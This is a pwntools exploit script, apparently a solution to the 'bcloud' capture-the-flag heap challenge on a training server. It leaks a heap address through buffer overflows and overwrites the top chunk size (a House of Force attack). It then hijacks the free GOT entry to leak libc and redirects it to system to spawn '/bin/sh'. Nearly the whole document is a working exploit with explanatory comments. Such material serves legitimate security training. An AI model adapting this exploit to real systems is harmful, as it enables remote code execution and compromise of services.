# BCLOUD

```python

from pwn import *
import time

context.terminal = ['tmux', 'splitw', '-h']
#ssh = ssh("acidburn", "192.168.56.103")
#cannot use the given libc because it has not simbles and it is hard to debug it without them
#r = process("./bcloud", env={'LD_PRELOAD': './libc-2.27.so'})
#gdb.attach(r, """
#	c
#	""")
#heap, bins, top_chunk --> commands from gdb to see the chunks

#to better see everything we receive and send
#context.log_level = "debug"

r = remote("training.jinblack.it", 2016)
input("wait")

#function to write a new note
def new_note(size, data):
	r.sendline(b"1")
	r.recvuntil(b"Input the length of the note content:\n")
	r.sendline(b"%d" % size) 
	r.recvuntil(b"Input the content:\n")
	r.send(data)
	if(len(data)<size):
		r.send(b"\n")
	r.recvuntil("--->>\n")

#function to modify a note
def edit(note_id, data):
	r.sendline(b"3")
	r.recvuntil(b'Input the id:\n')
	r.sendline(b"%d" % note_id)
	r.recvuntil(b'Input the new content:\n')
	r.sendline(data)
	r.recvuntil("--->>\n")

#reach the end of the first print
r.recvuntil(b"name:\n")
#fill the name buffer
r.send(b"A"*0x40)

#receive the address leaked thanks to an overflow of the malloc
leak = u32(r.recvuntil("!")[:-1][-4:])
print("! 0x%08x" % leak)

#fill the second buffer
r.recvuntil(b"Org:\n")
r.send(b"B"*0x40)
#fill the third buffer and overwrites the size of the top chunks with 0xffffff thanks to an overflow (the last allocated chunk is the one before the top chunk)
r.recvuntil(b"Host:\n")
r.send(b"\xff"*0x40)

#offset found by doing the difference between the address of the top chunk and a leaked address
top_chunk = leak + 0xf8
print("! top_chunk: 0x%08x" % top_chunk)

#start of the got table to ultimatly overwrite the free function
got = 0x0804b000
#global array with pointers to the notes that we could change
target = 0x0804b120

#the size of the chunk to allocate to reach the got table (&0xfffffff because it is a 32bit value) (-4 because there is a +1)
big_size = (target - top_chunk - 4) & 0xffffffff
print("! big_size: 0x%08x" % big_size)
print(b"%d" % u32(p32(big_size, signed=False), signed=True))

#modify the address of the top_chunk with the got one
r.sendline(b"1")
r.recvuntil(b"Input the length of the note content:\n")
#has to unsign and sign because it uses an atoi and it is a number that results positive but it should be negative, with this we fix it
r.sendline(b"%d" % u32(p32(big_size, signed=False), signed=True) ) 
r.recvuntil(b"Input the content:\n")
r.sendline("A")
r.recvuntil("--->>\n")


#address obtained by following the usage of puts from the got to the references and taking that address
puts_plt = 0x08048520
free_got = 0x0804b014

#return pointer to note_list + delta
new_note(50, "")

#set size of other notes
new_note(4, "")
new_note(4, "")
new_note(4, "")
new_note(4, "")


def arbitrary_write(address, data):
	edit(1,address)
	edit(4,data)

note_slot_5 = 0x804b134
read_got = 0x0804b00c

#overwrite the free function of the got with the puts function of the got to then have prints instead of frees
arbitrary_write(p32(free_got), p32(puts_plt))
#another libc function to be printed by the puts to have a libc address leak
arbitrary_write(p32(note_slot_5), p32(read_got))


#delete note 5 to have the libc address leak
r.sendline(b"4")
r.sendline(b"5")
r.recvuntil(b"id:\n")
read_libc = u32(r.recv(4))
r.recvuntil("--->>\n")
print("! read@libc 0x%04x" % read_libc)

system_libc = read_libc - 0xa9ab0
arbitrary_write(p32(free_got), p32(system_libc))

new_note(50, b"/bin/sh\x00")

r.sendline(b"4")
r.recvuntil(b'Input the id:\n')
r.sendline(b"5")
print("! read@libc 0x%04x" % read_libc)

#r.recvuntil("--->>\n")

#then write in a chunk /bin/sh\n and free that chunk

r.interactive()
```
